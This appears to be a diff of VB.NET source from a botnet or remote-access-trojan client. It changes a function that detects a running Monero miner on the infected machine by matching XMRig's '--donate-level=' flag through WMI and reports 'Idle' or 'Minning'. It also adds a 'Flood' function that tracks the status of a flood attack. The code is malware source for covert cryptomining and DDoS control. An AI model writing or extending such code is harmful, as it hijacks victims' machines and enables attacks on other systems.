@@ -161,7 +161,6 @@
             Try
                 If GTV("XMR") = Nothing Then
                     STV("XMR", "Idle")
-                    Return "Idle"
                 End If
 
                 Dim p() As Diagnostics.Process
@@ -172,17 +171,29 @@
                         Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
                         Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
                         For Each retObject As Management.ManagementObject In retObjectCollection
-                            If retObject("CommandLine").ToString.Contains("--donate-level=1") Then
-                                Return "Running"
+                            If retObject("CommandLine").ToString.Contains("--donate-level=") Then
+                                STV("XMR", "Minning")
                             End If
                         Next
                     Catch ex As Exception
                     End Try
                 Else
-                    Return "Idle"
+                    STV("XMR", "Idle")
+                End If
+                Return GTV("XMR").ToString
+            Catch ex As Exception
+            End Try
+        End Function
+
+        Public Shared Function Flood()
+            Try
+                If GTV("Flood") = Nothing Then
+                    STV("Flood", " ")
                 End If
 
+                Return GTV("Flood")
             Catch ex As Exception
+                Return "Error"
             End Try
         End Function
 
